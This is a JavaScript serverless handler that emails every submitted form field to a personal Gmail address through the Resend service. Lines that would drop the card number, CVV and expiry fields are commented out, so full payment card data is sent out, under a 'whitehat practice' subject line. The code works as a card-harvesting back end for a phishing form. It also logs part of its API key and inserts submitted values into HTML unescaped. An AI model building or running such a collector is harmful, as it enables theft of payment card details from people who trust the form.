import { Resend } from 'resend';
const resend = new Resend(process.env.RESEND_API_KEY);

export default async function handler(req, res) {
    console.log('API Key loaded?', process.env.RESEND_API_KEY ? 'Yes, starts with ' + process.env.RESEND_API_KEY.slice(0, 5) : 'NO - undefined')
    if (req.method !== 'POST') return res.status(405).end();

    const data = req.body;
    // delete data.f_cardnum;
    // delete data.f_cvv;
    // delete data.f_expiry;

    const rows = Object.entries(data)
        .map(([key, value]) => `<p><strong>${key}:</strong> ${value}</p>`)
        .join('');

    try {
        const { data: sendData, error } = await resend.emails.send({
            from: 'Practice Form <onboarding@resend.dev>',
            to: 'solcooper566@gmail.com', // <-- confirm this is your real email
            subject: 'whitehat practice form submission',
            html: rows || '<p>No data submitted</p>',
        });

        if (error) {
            console.error('Resend rejected the email:', error);
            return res.status(400).json({ error });
        }

        console.log('Email sent:', sendData);
        res.status(200).json({ success: true, sendData });
    } catch (err) {
        console.error('Unexpected error:', err);
        res.status(500).json({ error: 'Failed to send' });
    }
}